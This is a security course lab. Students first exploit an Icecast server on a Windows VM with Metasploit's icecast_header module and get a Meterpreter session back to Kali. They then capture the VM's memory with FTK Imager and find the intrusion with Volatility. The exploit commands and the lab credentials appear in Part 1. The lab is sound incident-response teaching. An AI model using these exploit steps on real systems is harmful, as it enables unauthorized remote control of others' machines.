---
title: "Incident response with Volatility memory analysis"
description:
include_toc: true
---

# Scenario

Consider the following scenario: one of your company's production servers has made an outbound connection to an IP address, which is abnormal behavior. Your task is to investigate what is going on.

# Part 1: Exploit Windows via Icecast Vulnerability

First, you'll play the role of the attacker. Compromise the Windows VM using the Icecast vulnerability in Metasploit.

## Start Icecast as admin

1.  Launch the Windows virtual machine. Log in to it as user `Labuser`,
    password `Passw0rd!`.

    If you are asked to provide a reason for an unexpected shutdown, you can
    ignore (cancel) this dialog. It is a Windows Server logging feature.

1.	On Windows desktop, right-click the "Icecast2 Win32" icon.
    <span class='badge badge-danger'>Important!</span> Select “Run as administrator.”
    If any warning message pops up, click “yes”.

    Running as Administrator will change the permissions that are obtained when
    the program is exploited.
    
2.	In the Icecast window that appears, click the button “Start server.”

    **Note**: The Icecast server is configured by default to a max of 5 connections.
    Each time you exploit the Icecast server, the connection count will tick up
    by one. If you use up all connections, simply kill and restart the Icecast server.

## Start msfconsole

In Kali, from a terminal, enter:

    msfconsole

## Finding and using an Icecast exploit

4.  From the `msf >` prompt, try:

        search icecast

5.  In the search output, you should see an exploit related to `icecast` called `exploit/windows/http/icecast_header`. Use it:

        use exploit/windows/http/icecast_header

    <div class='alert alert-info'><strong>Note:</strong> You can press the tab key within Metasploit to complete a module or command name you are typing. This makes entering commands in Metasploit faster. If you push the tab key twice it should show you all possible options for directory you are in.</div>

6.	Your msfconsole prompt should now look like this:

        msf exploit(icecast_header) >

    Indicating that the `icecast_header` module is loaded.

7.	Set the remote host to the Windows VM IP address:

        set rhost 192.168.56.100

10.	Meterpreter should already be selected as the payload. To verify, type:

        show options

13.	Set the "local host" variable to Kali's IP address on the infosec-net adapter.
    To set the local host variable, type

        set lhost 192.168.56.101

    A `lhost` was likely set for you by default -- but it may be an address for
    an incorrect interface! Make sure this setting is correct.

    <div class='alert alert-info'><strong>Note:</strong> Remember that you can
    easily check your IP in Unix/Linux by typing <code>ifconfig</code> or
    <code>ip</code> from within Metasploit.</div>

    {: #set-lhost-iface-name }
    **Note!** msfconsole allows you to specify an interface name as the `lhost`.
    The interface name for infosec-net is `virbr1`. You could set this as follows:

        set lhost virbr1

    Type `show options` to see that the variable has been set.

14.	With all options set, now it’s time to <span class='badge badge-danger'>
    <i class='fa fa-rocket'></i> launch the exploit!</span> Type:

        exploit

    (Or equivalently, `run`, but that's less fun.)

15. You should now be presented with the `meterpreter >` prompt.

16. Get the process ID by typing `getpid`.

# Part 2: Create a memory dump from the Windows VM

In this section, you'll use a digital forensics tool, FTK Imager, to make a copy or "image" of the Windows VM RAM.

1. On the Windows VM, create a new folder called "Evidence."

2. Right-click the folder and select "Properties." Select the "Sharing" tab, and click "Share." On the next pop-up Window, click "Share." Click "Done" and "Close."

2. From inside the Windows VM, open a web browser and [download the FTK Imager zip file](https://security-assignments.com/beta/assets/files/FTK_Imager.zip). 

3. In Windows, extract the zip file, and run `FTK Imager.exe` from the extracted directory.

4. In FTK Imager, from the "File" menu, select "Capture memory." For the destination path, select the "Evidence" folder you created. Click "Capture Memory."

5. In Kali, browse to the shared "Evidence" folder by opening the "Home" folder on the desktop. In the URL bar of the file explorer window, type: 

        smb://192.168.56.100
        
    or 
        
        smb://VAGRANTVM
	
    Browse to the "Evidence" folder you created on the Windows desktop. E.g., at `C:\Users\LabUser\Desktop\Evidence`.

6. Log in with user `labuser` and password `Passw0rd!`

7. Drag the `memdump.mem` file created by FTK Imager to the desktop of Kali.

# Part 3: Use Volatility to examine the memory dump

## Install Volatility

1. Open a terminal and run the command:

        git clone https://github.com/volatilityfoundation/volatility3.git

2. Change to the `volatility3` directory.

3. Run the command:

        pip3 install -r requirements.txt

## Examine the memory dump with Volatility

1. From the `volatility3` directory, run the following command:

        python3 vol.py -f ~/Desktop/memdump.mem windows.info

	This should display information about the memory dump file.

2. Next, in the scenario described at the top of this document, you have been alerted that this server has made an unusual outbound connection. Let's investigate. Run the following command:

        python3 vol.py -f ~/Desktop/memdump.mem windows.netscan

	This outputs the status of network connections for the Windows VM at the time that the memory dump was created. This represents a snapshot of network activity at this point in time.

3. Look for a line that shows an `ESTABLISHED` connection. What is the remote IP address for this connection? What is the remote port address? What is the name of the executable associated with this connection? What is the process ID (PID) for this executable?

	Note that port `4444` is the default outbound port for Meterpreter.

4. Get a list of running processes with the following command:

        python3 vol.py -f ~/Desktop/memdump.mem windows.pslist

	Can you locate the executable name and process ID?

5. Now we will use Volatility to scan the process ID for Icecast to look for hidden malicious code injected into the Icecast proces:

        python3 vol.py -f ~/Desktop/memdump.mem windows.malfind --pid [the process ID you identfied] --dump

	Volatility will output portions of memory associated with the Icecast PID that it believes is running malicious code.

	The `--dump` option will cause Volatility to write suspected malicious portions of memory to `.dmp` memory dump files.

6. Verify whether the `.dmp` files contain malware by opening virustotal.com in a browser in Kali and uploading each `.dmp` file for analysis. Select `Choose file` and then `Confirm upload`. 

	Virus Total will run the `.dmp` file through several dozen malware scanners. Do any of the scanners report that something is amiss? What do the `.dmp` files contain?
